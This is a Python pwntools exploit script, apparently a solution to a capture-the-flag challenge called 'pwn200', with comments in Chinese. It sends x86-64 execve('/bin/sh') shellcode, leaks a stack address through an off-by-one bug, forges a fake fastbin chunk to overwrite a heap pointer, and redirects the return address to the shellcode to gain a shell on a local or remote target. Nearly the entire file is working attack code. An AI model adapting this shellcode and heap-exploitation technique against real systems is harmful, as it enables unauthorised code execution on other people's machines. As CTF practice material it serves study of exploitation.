from pwn import *
from ctypes import *


DEBUG = 1
if DEBUG:
     p = process('./pwn200')
else:
     r = remote('172.16.4.93', 13025)


shellcode=""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"


def pwn():
    #gdb.attach(p,"b *0x400991")
    ##### off-by-one 泄露栈地址
    data='aaaaaaaa'+shellcode
    data=data.ljust(46,'a')
    data+='bb'
    p.send(data)
    p.recvuntil('bb')
    rbp_addr=p.recvuntil(', w')[:-3]
    rbp_addr=u64(rbp_addr.ljust(8,'\x00'))
    print hex(rbp_addr)

    fake_addr=rbp_addr-0x90
    shellcode_addr=rbp_addr-0x48

    ###输入id 伪造下一个堆块的size
    p.recvuntil('id ~~?')
    p.send('32'+'\n')

    p.recvuntil('money~')
    data=p64(0)*4+p64(0)+p64(0x41)   ####伪造堆块的size
    data=data.ljust(0x38,'\x00')+p64(fake_addr) ####覆盖堆指针
    p.send(data)
    
    
    p.recvuntil('choice : ')
    p.send('2'+'\n')          ####释放伪堆块进入fastbin
    
    p.recvuntil('choice : ')
    p.send('1'+'\n')
    p.recvuntil('long?')
    p.send('48\n')
    p.recvuntil('\n48\n')      #####将伪堆块申请出来
    data='a'*0x18+p64(shellcode_addr)   #####将eip修改为shellcode的地址
    data=data.ljust(48,'\x00')
    p.send(data)
    p.recvuntil('choice : ')
    p.send('3\n')      ####退出返回时会去执行shellcode

    p.interactive()


if __name__ == '__main__':
   pwn()

